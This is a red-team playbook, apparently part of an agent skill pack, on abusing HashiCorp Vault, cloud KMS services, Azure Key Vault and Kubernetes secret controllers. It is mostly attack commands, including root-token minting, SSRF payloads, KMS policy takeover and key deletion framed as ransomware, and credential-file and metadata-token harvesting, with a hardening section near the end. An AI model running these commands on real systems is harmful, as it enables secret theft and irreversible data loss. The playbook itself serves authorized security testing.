# HashiCorp Vault and Cloud KMS Attack Playbook

> Deep-dive companion to `skills/secret-management-attack/SKILL.md` and `guides/secret-management-attack-playbook.md`.
>
> Audience: red teamers and cloud security engineers who already understand the basics of secret discovery (gitleaks, trufflehog) and vault token theft. This guide zooms in on the **secrets-management platforms themselves** — HashiCorp Vault, AWS KMS, GCP KMS, Azure Key Vault, and the Kubernetes ecosystem that integrates with them (Kyverno, external-secrets, CSI drivers). The parent playbook covers how to *find* secrets. This playbook covers how to *abuse the platforms that store them* once you have a foothold.

---

## 1. Why a Separate Vault & Cloud KMS Playbook?

Secrets-management platforms are the highest-value target in any modern environment. A single HashiCorp Vault root token grants every secret every application can read. A single AWS KMS key policy misconfiguration lets an attacker decrypt any data the key protects. A single Azure Key Vault access policy misconfiguration grants service-principal credentials.

This guide is the operational counterpart to `secret-management-attack-playbook.md`:

- The parent playbook covers the **breadth** of secret discovery (repo, image, CI/CD, runtime).
- This playbook covers the **depth** of platform-specific exploitation: Vault's auth methods and secrets engines, AWS/GCP/Azure KMS attack surfaces, and the Kubernetes controller ecosystem (Kyverno, external-secrets) that mismanages them.

### 1.1 What this guide covers

| Section | Focus |
|---------|-------|
| 2 | Vault attack surface — auth methods, secrets engines, policies, response wrapping |
| 3 | Vault SSRF and response-wrap hijacking |
| 4 | AWS KMS key policy abuse and IAM escalation via KMS |
| 5 | GCP KMS IAM escalation |
| 6 | Azure Key Vault access policy review and abuse |
| 7 | BYOK / HYOK attacks |
| 8 | Kyverno, external-secrets, secrets-store-csi-driver misconfig hunting |

---

## 2. HashiCorp Vault Attack Surface

HashiCorp Vault is the most widely-deployed open-source secrets manager. Its attack surface is broader than most operators realize.

### 2.1 Vault architecture in one paragraph

Vault runs as a stateless service in front of an encrypted storage backend (Consul, integrated Raft, S3, GCS, etc.). Clients authenticate via an **auth method** (AppRole, Kubernetes, AWS, GCP, Azure, LDAP, OIDC, JWT, TLS certificates, username/password, token). Successful authentication returns a **client token**. The client token is a bearer credential with attached **policies** that determine which **secrets engine** paths the token can read or write. Secrets engines include KV (key-value), transit (cryptography as a service), database (dynamic DB credentials), AWS (dynamic AWS credentials), PKI (certificate authority), and many more.

The attack surface is the union of: every auth method's configuration, every token's policies, every secrets engine's configuration, and every network path to the Vault API.

### 2.2 The Vault CLI

```bash
# Set the address and token
export VAULT_ADDR='https://vault.example.com:8200'
export VAULT_TOKEN='s.XXXXXXXXXXXX'

# Check token info
vault token lookup

# List policies on this token
vault token capabilities $VAULT_TOKEN

# List secrets engines
vault secrets list

# List auth methods
vault auth list
```

### 2.3 Token types and their privileges

| Token type | How obtained | Typical privileges |
|-----------|--------------|---------------------|
| Root token | Initialized cluster, or `vault operator generate-root` | All paths |
| Service token | Authenticated via an auth method | Whatever policies the auth method attached |
| Batch token | Authenticated via an auth method, requested as batch | Limited: not renewable, not revocable |
| Response-wrapping token | Wraps another secret | Single-use, time-limited, can only unwrap |

### 2.4 Enumerating an acquired token

Once you have a Vault token (via SSRF, environment variable leak, file read, etc.), enumerate:

```bash
# What is this token?
vault token lookup
# Returns: policies, ttl, renewable, etc.

# What can this token do?
vault token capabilities
# Returns: create, read, update, delete, list, sudo for each path

# List secrets engines
vault secrets list
# PATH        TYPE          DESCRIPTION
# aws/        aws           Dynamic AWS credentials
# database/   database      Dynamic DB credentials
# kv/         kv            Key-value store
# pki/        pki           PKI certificate authority
# transit/    transit       Cryptography as a service

# List auth methods
vault auth list
# PATH           TYPE           DESCRIPTION
# approle/       approle        AppRole auth
# kubernetes/    kubernetes     Kubernetes auth
# userpass/      userpass       Username/password
```

### 2.5 The KV secrets engine — reading secrets

```bash
# KV v2 (versioned)
vault kv get kv/path/to/secret
# ===== Data =====
# Key      Value
# ---      -----
# password hunter2
# username admin

# KV v2 — list recursively
vault kv list kv/
vault kv list kv/path/
vault kv list kv/path/to/

# KV v2 — read all versions
vault kv metadata get kv/path/to/secret
# Returns: versions, deletion times, etc.

# KV v1
vault read kv/path/to/secret
```

### 2.6 The transit secrets engine — crypto as a service

The transit engine does cryptography without revealing keys. Attackers with `update` on `transit/encrypt/...` can encrypt arbitrary data using the key; with `update` on `transit/decrypt/...`, they can decrypt anything encrypted with that key.

```bash
# Encrypt
vault write transit/encrypt/my-key plaintext=$(base64 <<< "secret data")
# Returns: ciphertext "vault:v1:..."

# Decrypt
vault write transit/decrypt/my-key ciphertext="vault:v1:..."
# Returns: plaintext (base64)
```

**Attack**: an attacker with decrypt permission can decrypt any data the organization encrypted with this key — which often includes database columns, S3 objects, and application-layer data at rest.

### 2.7 The database secrets engine — dynamic DB credentials

```bash
# List configured database roles
vault list database/roles

# Request dynamic credentials for a role
vault read database/creds/my-app-role
# Returns: username "v-token-my-app-role-...", password "...", ttl 1h
```

**Attack**: dynamic credentials are time-limited but otherwise full database credentials. Use them within their TTL to access the database directly.

### 2.8 The AWS secrets engine — dynamic AWS credentials

```bash
vault list aws/roles
vault read aws/creds/my-app-role
# Returns: access_key, secret_key, ttl, IAM policy attached
```

**Attack**: dynamic AWS credentials inherit the IAM role that Vault's root credentials grant. If Vault's AWS root has admin in the target account, every dynamic credential has admin in the target account.

### 2.9 Policies — the actual RBAC

A Vault policy is an HCL file granting capabilities on paths:

```hcl
# Example over-permissive policy
path "secret/*" {
  capabilities = ["create", "read", "update", "delete", "list"]
}

path "auth/token/create" {
  capabilities = ["create", "update"]    # <-- the ability to mint tokens
}

path "auth/token/create/orphan" {
  capabilities = ["create", "update"]    # <-- the ability to mint orphan tokens
}

path "auth/token/create/root" {
  capabilities = ["create", "update"]    # <-- can mint root tokens (!)
}
```

**Critical privilege**: any token with `create/update` on `auth/token/create/root` can mint a root token. This is rarely intentional.

```bash
# Mint a root token (if you have the privilege)
vault token create -policy=root -orphan -ttl=0
# Returns a root token. Game over.
```

### 2.10 Auth method abuse — Kubernetes auth

Vault's Kubernetes auth method lets pods authenticate by presenting their projected SA token. The auth method validates the token via the Kubernetes TokenReview API and attaches policies based on the SA's namespace/name.

```bash
# Authenticate as a pod
vault write auth/kubernetes/login role=my-app-role jwt="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" iss="https://kubernetes.default.svc.cluster.local"
# Returns: client_token, lease_duration, renewable, policies
```

**Attack**: if the role's `bound_service_account_names` is `*` and `bound_service_account_namespaces` is `*`, any pod's SA token authenticates. Combined with broad policies, this is a cluster-wide compromise.

### 2.11 AppRole auth abuse

AppRole is a machine-to-machine auth method: a `role_id` (public identifier) and a `secret_id` (secret credential). Both are required to authenticate.

```bash
vault write auth/approle/login role_id="..." secret_id="..."
# Returns: client_token
```

**Attack**: the `role_id` is typically not secret (it's a UUID). The `secret_id` is. But AppRole's `secret_id` can be generated by any token with `update` on `auth/approle/role/<name>/secret-id`. If that policy is broad, any token can mint secret IDs for any role.

```bash
# Mint a new secret_id for any role (if you have the privilege)
vault write -force auth/approle/role/admin/secret-id
# Returns: secret_id "..."
```

### 2.12 The root token generation ceremony

If you have access to the unseal keys (or to enough of them), you can generate a new root token:

```bash
# Generate a root token (requires quorum of unseal keys)
vault operator generate-root -init
# Returns: nonce

vault operator generate-root -nonce=... <unseal-key-1>
vault operator generate-root -nonce=... <unseal-key-2>
vault operator generate-root -nonce=... <unseal-key-3>
# When threshold reached, returns: root token
```

**Attack**: if you have read access to the unseal keys (in a backup file, in a KMS key, in a CI variable), you can generate a root token.

---

## 3. Vault SSRF and Response-Wrap Hijacking

Vault has a feature called **response wrapping**: instead of returning a secret directly, Vault returns a single-use token that, when unwrapped, returns the secret. This is meant for safe transport across insecure channels.

### 3.1 Response wrapping — legitimate use

```bash
# Wrap a secret in a response-wrapping token
vault write -wrap-ttl=10m sys/wrapping/wrap secret="sensitive"
# Returns: wrapping_info.token "hvs.CAES..."

# Later, unwrap
vault unwrap hvs.CAES...
# Returns: the secret
```

The wrapping token is single-use and time-limited. After unwrap, the token is consumed.

### 3.2 The response-wrap hijack attack

If you can trick a Vault-issuing application into issuing a wrapped response that you then unwrap, you steal the secret. Common vector: SSRF in the application.

**Scenario**: a web app uses Vault to issue per-request dynamic DB credentials. The app's API endpoint takes a `redirect_url` parameter that is vulnerable to SSRF.

```http
POST /api/provision-db-user
Host: target.example.com
Content-Type: application/json

{
  "username": "attacker",
  "redirect_url": "http://localhost:8200/v1/sys/wrapping/unwrap"
}
```

If the app issues a wrapped credential and POSTs it to `redirect_url`, the attacker's request to the SSRF'd endpoint unwraps the credential.

### 3.3 The lookup-then-unwrap attack

Wrapping tokens have a `lookup` endpoint that returns metadata without consuming the token:

```bash
vault write sys/wrapping/lookup token=hvs.CAES...
# Returns: creation_ttl, creation_time, etc.
```

**Attack**: if you can intercept a wrapping token (e.g., from a log file), look it up first to see if it's been consumed. If not, unwrap it.

### 3.4 SSRF on Vault's API directly

If you have an SSRF vulnerability in an application that lets you reach `http://vault:8200`, you can use it to query Vault as the application:

```http
POST /api/fetch HTTP/1.1
Host: target.example.com

{
  "url": "http://vault:8200/v1/secret/data/app/prod-db"
}
```

If the application's request includes its Vault token (in `X-Vault-Token` header, or in the URL via query parameter), the SSRF executes as the application. Defenders: never pass Vault tokens via URL query parameters — they appear in access logs.

---

## 4. AWS KMS Key Policy Abuse

AWS Key Management Service (KMS) encrypts data using customer-managed keys (CMKs). Each CMK has a **key policy** (a resource-level policy, similar to an S3 bucket policy) that determines who can use the key. Misconfigured key policies are a common encryption-bypass vector.

### 4.1 Key policy basics

A KMS key policy is a JSON document attached to the key. The default policy allows the account root and the key administrator. Custom policies often grant broad access:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {"AWS": "*"},
      "Action": ["kms:Encrypt", "kms:Decrypt", "kms:ReEncrypt*"],
      "Resource": "*"
    }
  ]
}
```

The `Principal: {"AWS": "*"}` combined with `Action: kms:Decrypt` means anyone in the account (and, if the key is in a public account, anyone on the Internet) can decrypt with this key.

### 4.2 Key policy enumeration

```bash
# List all keys in the region
aws kms list-keys --region us-east-1

# Get a key's policy
aws kms get-key-policy --key-id <key-id> --policy-name default

# Find keys that allow decryption by anyone
for key_id in $(aws kms list-keys --query 'Keys[*].KeyId' --output text); do
  policy=$(aws kms get-key-policy --key-id $key_id --policy-name default --output text)
  if echo "$policy" | grep -q '"AWS": "\*"'; then
    echo "$key_id allows Principal '*'!"
  fi
done
```

### 4.3 Decrypting with a vulnerable key

If you have ciphertext encrypted with a vulnerable key, decrypt it:

```bash
aws kms decrypt \
  --ciphertext-blob fileb://encrypted.bin \
  --output text --query Plaintext | base64 -d
```

### 4.4 KMS-based IAM escalation

Some KMS keys have `kms:PutKeyPolicy` permission granted broadly. An attacker with `PutKeyPolicy` can change the key's policy to grant themselves access — including to keys they could not previously use.

```bash
# Modify the key policy to grant yourself access
aws kms put-key-policy \
  --key-id <target-key-id> \
  --policy-name default \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::111122223333:user/attacker"},"Action":"kms:*","Resource":"*"}]}'
```

### 4.5 Grant abuse

KMS supports **grants** — temporary, programmatic permissions that supplement the key policy. Grants are often used by AWS services (S3, EBS, Lambda) to use a key. If grants are broadly assignable, an attacker can grant themselves access:

```bash
# Create a grant for yourself
aws kms create-grant \
  --key-id <target-key-id> \
  --grantee-principal arn:aws:iam::111122223333:user/attacker \
  --operations Decrypt Encrypt
```

### 4.6 KMS key deletion as ransomware

An attacker with `kms:ScheduleKeyDeletion` can schedule the key for deletion, rendering all data encrypted with that key unrecoverable after the waiting period.

```bash
aws kms schedule-key-deletion --key-id <target-key-id> --pending-window-in-days 7
# The key will be deleted in 7 days. All data encrypted with it becomes unrecoverable.
```

**Defense**: key deletion should require MFA, a second approver, or a `kms:RequestAlias` condition.

---

## 5. GCP KMS IAM Escalation

Google Cloud KMS uses IAM for key access. Misconfigurations in IAM bindings on KMS resources (key rings, keys) can grant unintended access.

### 5.1 KMS IAM basics

```bash
# List key rings
gcloud kms keyrings list --location global

# List keys in a key ring
gcloud kms keys list --keyring=<ring> --location=global

# Get IAM policy on a key
gcloud kms keys get-iam-policy <key> --keyring=<ring> --location=global
```

### 5.2 Common misconfigurations

```yaml
# Overly broad IAM binding
bindings:
- members:
  - allUsers            # <-- anyone on the Internet
  - allAuthenticatedUsers
  role: roles/cloudkms.cryptoOperator
```

`allUsers` and `allAuthenticatedUsers` are public bindings — if applied to a KMS key, anyone can use that key.

### 5.3 Decrypting with GCP KMS

```bash
# Decrypt
gcloud kms decrypt \
  --key=<key> \
  --keyring=<ring> \
  --location=global \
  --ciphertext-file=encrypted.bin \
  --plaintext-file=decrypted.txt
```

### 5.4 Service-account token impersonation

If a KMS key is accessible to a service account, and you can impersonate that service account (via `iam.serviceAccounts.actAs`), you can use the key:

```bash
# Generate a token as the privileged SA
gcloud auth impersonate-service-account privileged@project.iam.gserviceaccount.com

# Use the token to access KMS
gcloud kms decrypt ... --impersonate-service-account=privileged@project.iam.gserviceaccount.com
```

---

## 6. Azure Key Vault Access Policy Review

Azure Key Vault uses either **access policies** (legacy) or **RBAC** (modern) to grant access. Both are frequently misconfigured.

### 6.1 Access policy model

An access policy grants a security principal (user, group, service principal) a set of permissions on the vault:

```json
{
  "tenantId": "...",
  "objectId": "...",
  "permissions": {
    "secrets": ["get", "list", "set", "delete", "recover", "backup", "restore", "purge"],
    "keys": ["get", "list", "create", "decrypt", "encrypt"],
    "certificates": ["get", "list", "create", "delete"]
  }
}
```

**Common misconfiguration**: `list` + `get` on secrets granted to all members of a broad group (e.g., "All Developers"), giving every developer read access to all production secrets.

### 6.2 Enumerate vaults

```bash
# List vaults
az keyvault list

# Show a vault's access policies
az keyvault show --name <vault> --query "properties.accessPolicies"
```

### 6.3 Reading secrets from a vault

```bash
# List secrets
az keyvault secret list --vault-name <vault>

# Get a specific secret
az keyvault secret show --vault-name <vault> --name <secret>
```

### 6.4 RBAC model

Modern Key Vaults use Azure RBAC. The relevant roles:

- `Key Vault Administrator` — full access
- `Key Vault Secrets User` — read secrets
- `Key Vault Reader` — read metadata (cannot read secret values)

```bash
# List role assignments on a vault
az role assignment list --scope <vault-resource-id>
```

### 6.5 Managed identity abuse

If a VM / container / app has a managed identity that has been granted access to a Key Vault, and you compromise that workload, you inherit the Key Vault access:

```bash
# Get an access token for Key Vault via the managed identity
TOKEN=$(curl -s -H Metadata: true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  | jq -r .access_token)

# Use the token
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://<vault>.vault.azure.net/secrets/<secret>?api-version=7.3"
```

---

## 7. BYOK / HYOK Attacks

**BYOK** (Bring Your Own Key) and **HYOK** (Hold Your Own Key) refer to architectures where the customer controls the encryption key, even when using a managed service (S3, GCS, Azure Storage, Snowflake, Databricks).

### 7.1 BYOK patterns

- **AWS**: KMS keys with `External` origin, key material imported from customer HSM.
- **GCP**: Cloud External Key Manager (Cloud EKM), keys held in external key manager (Fortanix, Thales, etc.).
- **Azure**: BYOK for Azure Storage, Azure SQL, Azure Data Lake via imported keys.

### 7.2 Attack vectors

| Vector | Description |
|--------|-------------|
| Key material theft | If the customer's key material is in a file (e.g., for import to KMS), steal the file |
| Key rotation abuse | BYOK keys rotate periodically. If an attacker can intercept the rotation API, they can substitute their own key material |
| Key revocation | If the customer can revoke the key (a HYOK feature), an attacker with revoke permissions can render encrypted data inaccessible (ransomware) |
| Key versioning abuse | Some BYOK systems support multiple key versions. An attacker with `CreateKeyVersion` permission can create a new version that encrypts subsequent data, while old versions remain decryptable |

### 7.3 HYOK — Cloud External Key Manager (EKM)

GCP's Cloud EKM lets customers use keys held in an external key manager (e.g., an on-prem HSM). The cloud service calls out to the external key manager for every decrypt operation.

**Attack**: if an attacker can MITM the EKM endpoint, they can log decrypt requests (capturing the ciphertexts being decrypted) or substitute responses.

### 7.4 Detecting BYOK misconfigurations

```bash
# AWS — find imported-key-material KMS keys
aws kms list-keys --query 'Keys[*].KeyId' --output text | while read key_id; do
  origin=$(aws kms describe-key --key-id $key_id --query 'KeyMetadata.Origin' --output text)
  if [ "$origin" = "EXTERNAL" ]; then
    echo "$key_id has external (BYOK) key material"
  fi
done
```

---

## 8. Kubernetes Secret-Management Controllers

Modern Kubernetes deployments rarely use raw `Secret` objects directly. Instead, they use controllers that fetch secrets from external platforms (Vault, AWS Secrets Manager, GCP Secret Manager, Azure Key Vault) and inject them into pods.

### 8.1 The controller ecosystem

| Controller | Purpose |
|-----------|---------|
| [external-secrets](https://github.com/external-secrets/external-secrets) | Syncs secrets from external platforms into Kubernetes `Secret` objects |
| [secrets-store-csi-driver](https://github.com/kubernetes-sigs/secrets-store-csi-driver) | Mounts secrets from external platforms directly into pods via CSI |
| [HashiCorp Vault Agent Sidecar Injector](https://developer.hashicorp.com/vault/docs/platform/k8s/injector) | Vault's own sidecar injector |
| [Kyverno](https://kyverno.io/) | Policy engine — can generate secrets, mutate pods |
| [Kubernetes External Secrets](https://github.com/external-secrets/kubernetes-external-secrets) | Legacy version of external-secrets |

### 8.2 external-secrets misconfig hunting

external-secrets uses `SecretStore` and `ExternalSecret` resources:

```yaml
apiVersion: external-secrets.io/v1beta1
kind: SecretStore
metadata:
  name: vault-backend
spec:
  provider:
    vault:
      server: "https://vault.example.com"
      path: "kv"
      version: "v2"
      auth:
        kubernetes:
          mountPath: "kubernetes"
          role: "eso-role"
          jwt:
            serviceAccountRef:
              name: default            # <-- too broad!
              namespace: default
```

**Common misconfigurations**:

1. **Broad SA reference**: the SecretStore references a default or widely-used SA. Any pod with that SA can impersonate the SecretStore.
2. **Wide Vault role**: the Vault role bound to the SecretStore's SA has broad KV access. The SecretStore can read every secret in Vault.
3. **Plaintext credentials**: some SecretStore configurations hard-code AWS access keys instead of using IRSA.

**Hunting**:

```bash
# List all SecretStores
kubectl get secretstores -A -o yaml

# List all ExternalSecrets (which secrets are being synced)
kubectl get externalsecrets -A -o yaml

# Find SecretStores using hard-coded credentials
kubectl get secretstores -A -o json | \
  jq '.items[] | select(.spec.provider.aws | .accessKeyIDSecretRef or .secretAccessKeySecretRef)'
```

### 8.3 secrets-store-csi-driver misconfig hunting

The CSI driver mounts secrets from external platforms directly into pods. The pod never sees a Kubernetes `Secret` object — the secret is in a tmpfs mount.

```yaml
apiVersion: secrets-store.csi.x-k8s.io/v1
kind: SecretProviderClass
metadata:
  name: app-vault-secrets
spec:
  provider: vault
  parameters:
    vaultAddress: "https://vault.example.com"
    roleName: "app-role"
    objects: |
      array:
        - |
          objectPath: "foo"
          objectName: "bar"
          secretPath: "kv/data/foo"
```

**Common misconfigurations**:

1. **Broad roleName**: the Vault role grants access to many secret paths.
2. **Pod-to-SecretProviderClass mismatch**: any pod can reference any SecretProviderClass in the namespace. If one pod in a namespace is over-privileged, every pod in that namespace can mount the same SPC.
3. **Secret sync to Kubernetes Secret**: if `secretObjects` is configured, the CSI driver syncs the external secret to a Kubernetes `Secret`, re-introducing the kube-apiserver audit surface.

### 8.4 Vault Agent Sidecar Injector misconfig

The injector adds a sidecar to pods that fetches Vault secrets and writes them to a shared volume.

```yaml
annotations:
  vault.hashicorp.com/agent-inject: "true"
  vault.hashicorp.com/role: "app-role"
  vault.hashicorp.com/agent-inject-secret-FOO: "kv/data/foo"
```

**Misconfigurations**:

1. **Broad role**: the role grants access to many secrets. The pod can request any of them via annotation.
2. **Missing namespace selector**: the injector webhook is configured without a namespace selector, so pods in any namespace can use it.
3. **Token leakage**: the sidecar's Vault token is in the pod's environment, accessible via `kubectl exec`.

### 8.5 Kyverno secret generation

Kyverno can generate secrets as part of a policy:

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: generate-database-credentials
spec:
  rules:
  - name: generate-db-secret
    match:
      resources:
        kinds:
        - Namespace
    generate:
      kind: Secret
      data:
        data:
          username: "cm9vdA=="          # <-- hard-coded credentials in policy!
          password: "{{ @pattern }}"
```

**Hunting**:

```bash
# List all Kyverno policies that generate secrets
kubectl get clusterpolicies,policies -A -o json | \
  jq '.items[] | select(.spec.rules[]?.generate.kind == "Secret")'
```

---

## 9. Discovery Patterns Across Platforms

This section consolidates the discovery commands across platforms, for use when you have a foothold in a cluster or VM and need to enumerate secrets platforms.

### 9.1 Finding Vault

```bash
# Environment variables
env | grep -i vault
# VAULT_ADDR, VAULT_TOKEN, VAULT_NAMESPACE

# Config files
find / -name 'vault*' -type f 2>/dev/null
find / -name '.vault-token' 2>/dev/null
cat ~/.vault-token

# Vault services in Kubernetes
kubectl get svc -A | grep -i vault
kubectl get pods -A | grep -i vault

# Vault on common ports (8200 default)
nmap -p 8200,8201 <ip-range>
```

### 9.2 Finding AWS credentials

```bash
# Environment
env | grep -i AWS

# Config files
cat ~/.aws/credentials
cat ~/.aws/config
find / -name 'credentials' -path '*/.aws/*' 2>/dev/null

# IMDS
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H "X-aws-ec2-metadata-token: $(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60)" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

### 9.3 Finding GCP credentials

```bash
# Environment
env | grep -i GOOGLE

# Config files
cat ~/.config/gcloud/application_default_credentials.json
find / -name 'application_default_credentials.json' 2>/dev/null

# Metadata
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### 9.4 Finding Azure credentials

```bash
# Environment
env | grep -i AZURE

# Config files
cat ~/.azure/accessTokens.json
find / -name 'accessTokens.json' 2>/dev/null

# Metadata
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 9.5 Finding Kubernetes secrets and secret-management configs

```bash
# Kubernetes secrets (covered in parent playbook)
kubectl get secrets -A

# External-secrets
kubectl get secretstores,externalsecrets -A

# CSI driver
kubectl get secretproviderclasspodstatus -A
kubectl get secretproviderclasses -A

# Vault injector annotations
kubectl get pods -A -o json | jq -r '.items[] | select(.metadata.annotations."vault.hashicorp.com/agent-inject" == "true") | "\(.metadata.namespace)/\(.metadata.name)"'
```

---

## 10. Defense Considerations (Reporting)

When reporting these findings, frame the remediation as defense-in-depth:

### 10.1 Vault hardening

- **Policy minimization**: audit every policy; remove `auth/token/create/root` and other dangerous capabilities.
- **Audit device**: enable Vault's audit device (`vault audit enable file file_path=/var/log/vault/audit.log`); every Vault operation is logged.
- **Sentinel**: for Vault Enterprise, use Sentinel policies for additional guardrails.
- **Short TTLs**: dynamic credentials with 1-hour TTLs minimize the value of stolen tokens.
- **Namespace isolation**: in Vault Enterprise, use namespaces to fully isolate teams.

### 10.2 AWS KMS hardening

- **Key policy minimization**: no `Principal: {"AWS": "*"}`. Each principal should be explicitly named.
- **Separation of duties**: `kms:ScheduleKeyDeletion` requires MFA or a second approver.
- **CloudTrail logging**: monitor `Decrypt` calls for anomalies.
- **Key rotation**: enable automatic annual rotation.

### 10.3 GCP KMS hardening

- **No `allUsers` / `allAuthenticatedUsers`**: these are almost never appropriate on KMS resources.
- **IAM Conditions**: use conditions to restrict key access by time, IP, or resource.
- **Cloud Audit Logs**: monitor KMS API calls.

### 10.4 Azure Key Vault hardening

- **Migrate from access policies to RBAC**: RBAC is more granular and consistent with Azure IAM.
- **Purge protection**: enable purge protection to prevent immediate deletion of deleted secrets.
- **Soft delete**: enable soft delete for recovery.
- **Managed identity**: use managed identities, not hard-coded credentials.

### 10.5 Kubernetes controller hardening

- **Namespace isolation**: SecretStore per namespace, with namespace-specific Vault roles.
- **SA minimization**: do not use the default SA; create per-workload SAs.
- **Admission policy**: use OPA Gatekeeper or Kyverno to enforce SecretStore naming and configuration standards.

---

## 11. References

### 11.1 Documentation

- HashiCorp Vault: [developer.hashicorp.com/vault/docs](https://developer.hashicorp.com/vault/docs)
- AWS KMS: [docs.aws.amazon.com/kms](https://docs.aws.amazon.com/kms/latest/developerguide/overview.html)
- GCP Cloud KMS: [cloud.google.com/kms/docs](https://cloud.google.com/kms/docs)
- Azure Key Vault: [learn.microsoft.com/azure/key-vault](https://learn.microsoft.com/azure/key-vault/)
- external-secrets: [external-secrets.io](https://external-secrets.io/)
- secrets-store-csi-driver: [secrets-store-csi-driver.sigs.k8s.io](https://secrets-store-csi-driver.sigs.k8s.io/)
- Kyverno: [kyverno.io](https://kyverno.io/)

### 11.2 Tools

- Vault CLI: bundled with Vault
- aws-vault: [github.com/99designs/aws-vault](https://github.com/99designs/aws-vault)
- gcp-scanner: [github.com/google/gcp_scanner](https://github.com/google/gcp_scanner)
- MicroBurst (Azure): [github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)
- ROADtools (Azure): [github.com/dirkjanm/ROADtools](https://github.com/dirkjanm/ROADtools)
- Pacu (AWS exploitation): [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)

### 11.3 Research and talks

- "Attacking HashiCorp Vault" — multiple presentations at DEF CON and BSides
- "Holding the Keys to the Kingdom: Abusing Cloud KMS" — various conference talks
- "Azure AD -> Azure Key Vault" — Dirkanm's blog on Azure attack chains
- Rhino Security Labs' research on AWS IAM and KMS escalation paths

### 11.4 Hardening references

- HashiCorp Vault Production Hardening: [developer.hashicorp.com/vault/tutorials/operations/production-hardening](https://developer.hashicorp.com/vault/tutorials/operations/production-hardening)
- AWS KMS Best Practices: [docs.aws.amazon.com/kms/latest/developerguide/best-practices.html](https://docs.aws.amazon.com/kms/latest/developerguide/best-practices.html)
- Azure Key Vault Best Practices: [learn.microsoft.com/azure/key-vault/general/best-practices](https://learn.microsoft.com/azure/key-vault/general/best-practices)

---

## Appendix A: Vault & Cloud KMS Attack Cheat Sheet

```bash
# === Vault ===
export VAULT_ADDR='https://vault.example.com:8200'
export VAULT_TOKEN='s.XXXXXXXX'
vault token lookup
vault token capabilities
vault secrets list
vault auth list
vault kv list kv/
vault kv get kv/path/to/secret
vault read database/creds/my-role
vault write transit/decrypt/my-key ciphertext="vault:v1:..."
vault token create -policy=root -orphan -ttl=0  # if you have create/root

# === AWS KMS ===
aws kms list-keys
aws kms get-key-policy --key-id <id> --policy-name default
aws kms decrypt --ciphertext-blob fileb://enc.bin --output text --query Plaintext | base64 -d
aws kms schedule-key-deletion --key-id <id> --pending-window-in-days 7

# === GCP KMS ===
gcloud kms keyrings list --location global
gcloud kms keys list --keyring=<ring> --location=global
gcloud kms keys get-iam-policy <key> --keyring=<ring> --location=global
gcloud kms decrypt --key=<key> --keyring=<ring> --location=global \
  --ciphertext-file=enc.bin --plaintext-file=dec.txt

# === Azure Key Vault ===
az keyvault list
az keyvault show --name <vault> --query "properties.accessPolicies"
az keyvault secret list --vault-name <vault>
az keyvault secret show --vault-name <vault> --name <secret>

# === Kubernetes controllers ===
kubectl get secretstores,externalsecrets -A
kubectl get secretproviderclasses -A
kubectl get pods -A -o json | jq '.items[] | select(.metadata.annotations."vault.hashicorp.com/agent-inject" == "true") | .metadata.name'

# === Cloud metadata ===
# AWS IMDSv2
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP metadata
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure metadata
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

*This playbook is maintained as part of the kali-claw `secret-management-attack` skill. Updates are tracked via `skills/secret-management-attack/SKILL.md` metadata version.*
